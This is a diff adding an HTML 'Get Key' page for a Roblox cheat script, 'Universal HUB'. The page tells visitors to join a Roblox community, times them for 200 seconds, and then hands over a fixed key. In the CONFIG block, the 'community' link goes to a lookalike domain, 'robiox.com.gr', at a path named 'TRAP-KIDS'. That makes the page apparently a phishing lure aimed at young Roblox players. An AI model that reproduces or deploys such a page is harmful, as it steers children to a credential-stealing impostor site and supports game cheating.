@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Get Key</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@500;700&family=Cormorant+Garamond:wght@600;700&family=UnifrakturCook:wght@700&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#0b0d14;--card:#141826;--line:#2b2b33;--text:#f6f6fb;--muted:#cfcfdb;--accent:#fff;--accent2:#ff3347;--ok:#fff;
+color-scheme:dark;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
+#bg{position:fixed;inset:0;z-index:0;background:#000 url(eyes.gif) center/cover no-repeat;image-rendering:pixelated}
+*{box-sizing:border-box}
+html,body{margin:0;min-height:100%}
+body{background:#000;color:var(--text);font-family:"Cinzel","Cormorant Garamond",Georgia,"Times New Roman",serif;display:flex;align-items:center;justify-content:center;padding:24px}
+.card{position:relative;z-index:1;width:100%;max-width:440px;background:linear-gradient(rgba(0,0,0,.6),rgba(0,0,0,.6)),#000 url(hands.jpg) center/cover no-repeat;border:2px solid #fff;border-radius:18px;padding:28px;box-shadow:0 20px 60px rgba(0,0,0,.35)}
+h1{margin:0 0 4px;font-size:34px;font-family:"UnifrakturCook","Pirata One",Georgia,serif;font-weight:700;letter-spacing:.5px;color:#fff;text-shadow:0 0 14px rgba(255,255,255,.55),0 2px 4px #000}
+.by{color:var(--muted);font-size:14px;margin-bottom:22px;font-family:"Cormorant Garamond",Georgia,serif;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;text-shadow:0 1px 3px #000}
+.step{display:flex;gap:12px;align-items:center;padding:12px 14px;background:rgba(0,0,0,.5);text-shadow:0 1px 3px #000;border:1px solid rgba(255,255,255,.35);border-radius:12px;margin-bottom:10px}
+.num{width:26px;height:26px;border-radius:50%;background:var(--line);display:grid;place-items:center;font-size:13px;font-weight:700;flex:none}
+.step.done .num{background:var(--ok);color:#06241d}
+.step small{display:block;color:var(--muted);font-size:14px;font-family:"Cormorant Garamond",Georgia,serif;font-weight:700;margin-top:2px}
+button{font:inherit;cursor:pointer;border:0;border-radius:12px;padding:13px 16px;font-weight:700;letter-spacing:2px;text-transform:uppercase;width:100%}
+.go{background:#fff;color:#000;margin-top:8px}
+.go:disabled{opacity:.5;cursor:not-allowed}
+.bar{height:6px;background:var(--line);border-radius:99px;overflow:hidden;margin-top:14px;display:none}
+.bar i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--accent),var(--accent2))}
+.key{display:none;margin-top:18px}
+.keybox{font-family:ui-monospace,Menlo,Consolas,monospace;background:var(--bg);border:1px dashed var(--accent2);color:var(--accent2);padding:14px;border-radius:12px;text-align:center;word-break:break-all;font-size:15px}
+.copy{background:var(--line);color:var(--text);margin-top:10px}
+.note{color:var(--muted);font-size:14px;font-family:"Cormorant Garamond",Georgia,serif;font-weight:700;text-align:center;margin-top:16px;text-shadow:0 1px 3px #000}
+</style>
+</head>
+<body>
+<div id="bg"></div>
+<div class="card">
+  <h1 id="hub">Universal HUB</h1>
+  <div class="by" id="by">by Yazusae · Key System</div>
+
+  <div class="step" id="s1"><div class="num">1</div><div>Join to our Roblox Community<small>Click Start to open the group, then wait here</small></div></div>
+  <div class="step" id="s2"><div class="num">2</div><div>Complete checkpoint<small>Wait for the timer to finish</small></div></div>
+  <div class="step" id="s3"><div class="num">3</div><div>Copy your key<small>Paste it into the script’s key box</small></div></div>
+
+  <button class="go" id="start">Start</button>
+  <div class="bar" id="bar"><i id="fill"></i></div>
+
+  <div class="key" id="keyWrap">
+    <div class="keybox" id="key"></div>
+    <button class="copy" id="copy">Copy Key</button>
+  </div>
+  <div class="note" id="status">Your key will appear here after the steps are done.</div>
+</div>
+
+<script>
+// ===== EDIT THESE =====
+var CONFIG = {
+  hubName: "Universal HUB",
+  author: "Yazusae",
+  key: "UNIVERSAL-HUB-FREE-KEY-2026", // must match the key in your Lua script
+  communityUrl: "https://www.robiox.com.gr/communities/1376591178/TRAP-KIDS",
+  joinWaitSeconds: 200,                // step 1: wait after opening the community (seconds)
+  waitSeconds: 8                       // step 2: checkpoint timer (seconds)
+};
+// ======================
+document.getElementById("hub").textContent = CONFIG.hubName;
+document.getElementById("by").textContent = "by " + CONFIG.author + " · Key System";
+document.title = CONFIG.hubName + " – Get Key";
+
+var $ = function(id){return document.getElementById(id)};
+function mark(id){$(id).classList.add("done")}
+
+function fmt(s){ return Math.floor(s / 60) + ":" + ("0" + (s % 60)).slice(-2); }
+function runTimer(seconds, onTick, onDone){
+  var t = 0, total = seconds * 10;
+  var iv = setInterval(function(){
+    t++;
+    $("fill").style.width = (t / total * 100) + "%";
+    onTick(Math.max(0, Math.ceil((total - t) / 10)));
+    if (t >= total){ clearInterval(iv); onDone(); }
+  }, 100);
+}
+
+$("start").onclick = function(){
+  var btn = $("start"); btn.disabled = true; btn.textContent = "Working…";
+  if (CONFIG.communityUrl) { try { window.open(CONFIG.communityUrl, "_blank", "noopener"); } catch(e){} }
+  $("bar").style.display = "block";
+  var sub = $("s1").querySelector("small");
+  // Step 1 is not marked done right away: the page can't verify the join, so it waits first
+  runTimer(CONFIG.joinWaitSeconds, function(left){
+    sub.textContent = "Checking… " + fmt(left);
+    $("status").textContent = "Step 1: " + fmt(left) + " left";
+  }, function(){
+    mark("s1"); sub.textContent = "Done";
+    runTimer(CONFIG.waitSeconds, function(left){
+      $("status").textContent = "Checkpoint: " + fmt(left) + " left";
+    }, function(){
+      mark("s2"); mark("s3");
+      btn.style.display = "none"; $("bar").style.display = "none";
+      $("key").textContent = CONFIG.key;
+      $("keyWrap").style.display = "block";
+      $("status").textContent = "Done! Copy the key and paste it into the script.";
+    });
+  });
+};
+
+$("copy").onclick = function(){
+  var done = function(){ $("copy").textContent = "Copied ✓"; setTimeout(function(){ $("copy").textContent = "Copy Key"; }, 1500); };
+  try {
+    navigator.clipboard.writeText(CONFIG.key).then(done, fallback);
+  } catch(e){ fallback(); }
+  function fallback(){
+    var r = document.createRange(); r.selectNode($("key"));
+    var s = getSelection(); s.removeAllRanges(); s.addRange(r);
+    try { document.execCommand("copy"); done(); } catch(e){}
+  }
+};
+</script>
+</body>
+</html>
